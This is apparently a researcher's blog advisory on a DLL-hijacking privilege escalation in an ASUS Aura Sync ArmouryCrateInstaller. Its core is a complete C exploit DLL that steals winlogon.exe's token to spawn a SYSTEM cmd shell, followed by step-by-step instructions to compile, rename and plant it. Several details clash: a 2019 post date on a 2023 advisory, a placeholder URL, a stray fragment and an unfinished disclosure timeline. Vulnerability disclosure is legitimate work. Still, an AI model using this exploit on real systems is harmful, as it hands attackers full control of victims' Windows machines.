---
title: Local Privilege Escalation in Aura Sync / Aura Creator - ArmouryCrate Windows Installer
author: cotes
date: 2019-08-08 14:10:00 +0800
categories: [Windows]
tags: [writing]
render_with_liquid: false
---

## 0x01: Details

- Title: Local Privilege Escalation in Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2 For Windows Installer
- CVE ID: None
- Vendor ID : None
- Advisory Published: 5 Aug 2023
- Advisory URL : [https://www.asus.com](AddHere)

## 0x02: Test Environment

ArmouryCrateInstaller Version: 3.2.7.2 

OS : Windows 10 20H2 (OS Build: 19045.3508)

## 0x03: Vulnerability details

Vulnerability that allows a local attacker to gain SYSTEM privileges by exploiting administrator privileges, and that enables the server thread to perform actions on behalf of the client, but within the limits of the client's security context.

## 0x04: Technical description

Many DLLs are loaded from the directory where the ArmouryCrateInstaller is located. Among these Dlls, `TextShaping.dll` is loaded, and this DLL load is done with Administrator privileges. So, by placing `profapi.dll, PROPSYS.dll, edputil.dll, urlmon.dll, SspiCli.dll` in the directory where the ArmouryCrateInstaller Version, you can gain SYSTEM privileges by abusing Administrator privileges.

Over the horizon comes

## 0x05: Complete Exploit

```c
/*
 - ZeroDay Research  -
@component: Asus Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2

@filename: dllpoc.cpp

@vulnerability: 0Day - Arbitrary Code Execution (DLL Hijacking) To Local Privilege Escalation In Asus Aura Sync - ArmouryCrateInstaller 3.2.7.2

@author: RashidKhan Pathan (iHexCoder)


*/

#include <stdio.h>
#include <windows.h>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>
#include <iostream>


#pragma comment (lib,"advapi32.lib")

void exploit() {
    printf("[+] Vulnerability: Local Privilege Escalation Via DLL Hijacking \n");
    printf("[+] Author: RashidKhan Pathan (iHexCoder) \n");
    printf("[+] Tested On: Windows 10 20H2 (OS Build: 19045.3508) \n");
    printf("[+] Affected Products: Aura Sync / Aura Creator - ArmouryCrateInstaller 3.2.7.2 \n");
    printf("[+] Affected Components: profapi.dll, PROPSYS.dll, edputil.dll, urlmon.dll, SspiCli.dll \n");

    DWORD lpidProcess[2048], lpcbNeeded, cProcesses;
    EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 p32;
    p32.dwSize = sizeof(PROCESSENTRY32);

    int processwinloginPid;

    if (Process32First(hSnapshot, &p32)) {
        do {
            if (wcscmp(p32.szExeFile, L"winlogon.exe") == 0) {
                printf("[+] Located winlogon.exe by process name (PID %d)\n", p32.th32ParentProcessID);
                processwinloginPid = p32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &p32));

        CloseHandle(hSnapshot);

        LUID luid;
        HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());

        if (currentProc) {
            HANDLE TokenHandle = NULL;
            BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
            if (hProcessToken) {
                BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

                if (!checkToken) {
                    printf("[+] Current Process token Already Include SeDebugPrivilege \n");
                }
                else
                {
                    TOKEN_PRIVILEGES tokenPrivs;

                    tokenPrivs.PrivilegeCount = 1;
                    tokenPrivs.Privileges[0].Luid = luid;
                    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
                    
                    if (adjustToken != 0)
                    {
                        printf("[+] Added SeDebugPrivilege to the current process token: %lx \n", adjustToken);
                    }
                }
                CloseHandle(TokenHandle);
            }
        }
        CloseHandle(currentProc);

        HANDLE hProcess = NULL;
        HANDLE TokenHandle = NULL;
        HANDLE NewToken = NULL;
        BOOL OpenToken;
        BOOL Impersonate;
        BOOL Duplicate;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processwinloginPid);

        if (!hProcess)
        {
            printf("[-] Faild To Obtain a Handle To The Target PID \n");
        }
        printf("[+] Obtained Handle To The Target PID %lx\n", hProcess);

        OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);

        if (!OpenToken)
        {
            printf("[-] Faild To Obtain Handle to The TOKEN %d\n", GetLastError());
        }
        printf("[+] Obtained A Handle To The Target Token %lx \n", OpenToken);

        Impersonate = ImpersonateLoggedOnUser(TokenHandle);
        if (!Impersonate)
        {
            printf("[-] Faild To Impersonate The TOKEN User \n");
        }
        printf("[+] Impersonted The Token's User %lx \n", Impersonate);

        Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
        if (!Duplicate)
        {
            
            printf("[-] Faild To Dulplicate The Target Token\n");
        }
        printf("[+] Duplicated The Target Token %lx \n", Duplicate);

        BOOL NewProcess;
        STARTUPINFO lpStartupInfo = { 0 };
        PROCESS_INFORMATION lpProcessInformation = { 0 };

        lpStartupInfo.cb = sizeof(lpStartupInfo);

        NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

        if (!NewProcess)
        {
            printf("[-] Faild To Create A SYSTEM Process \n");
        }
        printf("[+] Create A SYSTEM Process %lx \n", NewProcess);
        printf("[+] Getting System Shell \n");
        printf("-------------------------------------------------------\n");

        CloseHandle(NewToken);
        CloseHandle(hProcess);
        CloseHandle(TokenHandle);
    }
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        exploit();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

1. Use Visual Studio 2019.
2. Compile the project in the DLL directory in x64 Release mode.
3. Rename the compiled dll to `profapi.dll` and place it in the same directory as ArmouryCrateInstaller.exe.
4. Run `ArmouryCrateInstaller`
5. We Will Get A System Shell With `NT Authority`

## 0x06: Affected Products

This vulnerability affects the following product:

- Asus Aura Sync/Creator - ArmouryCrateInstaller Version < 3.2.7.2

## 0x07: Credit information

RashidKhan Pathan (@itRashid)

## 0x08: TimeLine
- 4  Aug 2023 : Vulnerability Found
- 27 Aug 2023 : First time contacted via (security@asus.com) about ticket is not creating issue and vulnerability is critical
- 29 Aug 2023 : recevied a system generated mail from them, they told me to try again using ASUS Security Advisory Page
- 30 Aug 2023 :

## 0x09: Reference

- [https://www.asus.com](https://www.asus.com)
